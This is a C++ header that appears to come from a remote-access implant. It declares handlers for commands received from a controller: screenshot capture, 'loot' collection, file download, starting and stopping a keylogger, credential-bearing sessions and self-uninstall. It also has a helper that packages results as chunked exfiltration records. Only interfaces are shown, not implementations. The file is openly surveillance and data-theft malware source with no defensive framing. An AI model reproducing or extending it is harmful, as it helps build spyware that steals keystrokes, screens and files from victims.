#pragma once

#include "Beacon.hpp"
#include "ExfilEnvelope.hpp"
#include "Payloads.hpp"

#include <atomic>
#include <deque>
#include <memory>
#include <mutex>
#include <string>
#include <string_view>
#include <vector>

class SessionManager;

struct ICommandHandler {
    virtual ~ICommandHandler() = default;
    [[nodiscard]] virtual bool can_handle(std::string_view cmd) const = 0;
    [[nodiscard]] virtual std::vector<CommandResult> execute(std::string_view cmd, const CommandDAO& command) = 0;
};

class TimeoutCommandHandler final : public ICommandHandler {
public:
    explicit TimeoutCommandHandler(int& current_sleep) : current_sleep_(current_sleep) {}
    [[nodiscard]] bool can_handle(std::string_view cmd) const override { return cmd.starts_with("timeout"); }
    [[nodiscard]] std::vector<CommandResult> execute(std::string_view cmd, const CommandDAO&) override;
private:
    int& current_sleep_;
};

class ScreenshotCommandHandler final : public ICommandHandler {
public:
    [[nodiscard]] bool can_handle(std::string_view cmd) const override { return cmd.starts_with("screenshot"); }
    [[nodiscard]] std::vector<CommandResult> execute(std::string_view cmd, const CommandDAO&) override;
};

class LootCommandHandler final : public ICommandHandler {
public:
    [[nodiscard]] bool can_handle(std::string_view cmd) const override { return cmd.starts_with("loot"); }
    [[nodiscard]] std::vector<CommandResult> execute(std::string_view cmd, const CommandDAO&) override;
};

class DownloadCommandHandler final : public ICommandHandler {
public:
    [[nodiscard]] bool can_handle(std::string_view cmd) const override { return cmd.starts_with("download "); }
    [[nodiscard]] std::vector<CommandResult> execute(std::string_view cmd, const CommandDAO& command) override;
};

class KeyloggerStartHandler final : public ICommandHandler {
public:
    explicit KeyloggerStartHandler(Keylogger& keylogger) : keylogger_(keylogger) {}
    [[nodiscard]] bool can_handle(std::string_view cmd) const override { return cmd.starts_with("keylogger_start"); }
    [[nodiscard]] std::vector<CommandResult> execute(std::string_view cmd, const CommandDAO& command) override;
private:
    Keylogger& keylogger_;
};

class KeyloggerStopHandler final : public ICommandHandler {
public:
    explicit KeyloggerStopHandler(Keylogger& keylogger) : keylogger_(keylogger) {}
    [[nodiscard]] bool can_handle(std::string_view cmd) const override { return cmd.starts_with("keylogger_stop"); }
    [[nodiscard]] std::vector<CommandResult> execute(std::string_view cmd, const CommandDAO&) override;
private:
    Keylogger& keylogger_;
};

class SessionCommandHandler final : public ICommandHandler {
public:
    explicit SessionCommandHandler(SessionManager& sessions, std::string user, std::string pass)
        : sessions_(sessions), user_(std::move(user)), pass_(std::move(pass)) {}
    [[nodiscard]] bool can_handle(std::string_view cmd) const override { return cmd.starts_with("session"); }
    [[nodiscard]] std::vector<CommandResult> execute(std::string_view cmd, const CommandDAO&) override;
private:
    SessionManager& sessions_;
    std::string user_;
    std::string pass_;
};

class CloseSessionCommandHandler final : public ICommandHandler {
public:
    explicit CloseSessionCommandHandler(SessionManager& sessions) : sessions_(sessions) {}
    [[nodiscard]] bool can_handle(std::string_view cmd) const override { return cmd.starts_with("close"); }
    [[nodiscard]] std::vector<CommandResult> execute(std::string_view cmd, const CommandDAO&) override;
private:
    SessionManager& sessions_;
};

class UninstallCommandHandler final : public ICommandHandler {
public:
    explicit UninstallCommandHandler(std::atomic<bool>& running) : running_(running) {}
    [[nodiscard]] bool can_handle(std::string_view cmd) const override { return cmd.starts_with("uninstall"); }
    [[nodiscard]] std::vector<CommandResult> execute(std::string_view cmd, const CommandDAO&) override;
private:
    std::atomic<bool>& running_;
};

class CommandDispatcher {
public:
    CommandDispatcher(
        int& current_sleep,
        Keylogger& keylogger,
        SessionManager& sessions,
        std::atomic<bool>& running,
        std::string user,
        std::string pass);

    [[nodiscard]] std::vector<CommandResult> dispatch(const CommandDAO& cmd);

private:
    std::vector<std::unique_ptr<ICommandHandler>> handlers_;
};

namespace command_result {

[[nodiscard]] inline CommandResult make(
    const CommandDAO& cmd,
    exfil::ExfilKind kind,
    std::string data,
    int status = exfil::kStatusSuccess,
    int chunk_index = 0,
    int chunk_total = 1) {
    CommandResult result;
    result.command_uid = cmd.uid;
    result.result_data = std::move(data);
    result.status = status;
    result.kind = std::string(exfil::kind_to_string(kind));
    result.chunk_index = chunk_index;
    result.chunk_total = chunk_total;
    return result;
}

} // namespace command_result
